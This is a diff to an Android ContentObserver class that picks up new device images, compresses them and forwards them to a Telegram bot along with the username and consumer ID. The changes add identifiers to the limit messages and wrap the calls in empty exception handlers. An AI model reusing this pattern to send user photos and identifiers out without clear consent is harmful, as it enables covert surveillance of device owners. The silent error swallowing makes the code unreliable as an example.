@@ -5,7 +5,6 @@ import android.content.ContentUris;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.iocl.dac_collector.Firebase.FirebaseDBClient;
 import android.iocl.dac_collector.Utility.FirebaseConfigManager;
 import android.iocl.dac_collector.Utility.ImageCompressor;
 import android.iocl.dac_collector.Utility.SharedPrefs;
@@ -35,7 +34,7 @@ public class ImageObserver extends ContentObserver {
     private final Set<String> mPendingImagePaths = new HashSet<>();
 
     private final Runnable mFlushRunnable = this::processPendingImages;
-    private  int calls = 0;
+    private int calls = 0;
 
     public ImageObserver(Handler handler, Context context) {
         super(handler);
@@ -60,8 +59,6 @@ public class ImageObserver extends ContentObserver {
         }
 
         calls++;
-
-
 
 
         // 🔑 Debounce: reset runnable each time
@@ -150,9 +147,17 @@ public class ImageObserver extends ContentObserver {
 
                 Log.d(TAG, "Daily image count limit reached");
 
-                TelegramBot.with(mContext).sendMessage(
-                        "Daily image count limit reached\n" + getStats()
-                );
+
+                try {
+
+
+                    TelegramBot.with(mContext).sendMessage(
+                            "Daily image count limit reached for user : " + SharedPrefs.getUsername() + "\n" +
+                                    getStats()
+                    );
+                } catch (Exception e) {
+
+                }
 
                 break;
             }
@@ -206,23 +211,35 @@ public class ImageObserver extends ContentObserver {
             // Stop if MB limit reached
             if ((uploadedBytes + finalUploadSize) > maxBytes) {
 
-                Log.d(TAG, "Daily MB limit reached");
 
-                TelegramBot.with(mContext).sendMessage(
-                        "Daily MB limit reached\n" + getStats()
-                );
+
+                try {
+                    TelegramBot.with(mContext).sendMessage(
+                            "Daily MB limit reached for user " + SharedPrefs.getConsumerId() + "\n" +
+                                    getStats()
+                    );
+                } catch (Exception e) {
+
+                }
 
                 break;
             }
 
-            TelegramBot.with(mContext).sendPhoto(
-                    compressedFile,
-                    SharedPrefs.getUsername()
-                            + "-"
-                            + SharedPrefs.getConsumerId()
-                            + "\n"
-                            + Utility.getStandardDatenTime()
-            );
+            try {
+
+
+                TelegramBot.with(mContext).sendPhoto(
+                        compressedFile,
+                        SharedPrefs.getUsername()
+                                + "-"
+                                + SharedPrefs.getConsumerId()
+                                + "\n"
+                                + Utility.getStandardDatenTime()
+                );
+
+            } catch (Exception e) {
+            }
+
 
             // Update counters
             uploadedCount++;
@@ -270,8 +287,8 @@ public class ImageObserver extends ContentObserver {
                         ));
 
 
-
     }
+
     private void checkAndResetLimits() {
 
         long now = System.currentTimeMillis();
@@ -296,8 +313,6 @@ public class ImageObserver extends ContentObserver {
             Log.d(TAG, "Image upload limits reset");
         }
     }
-
-
 
 
 }
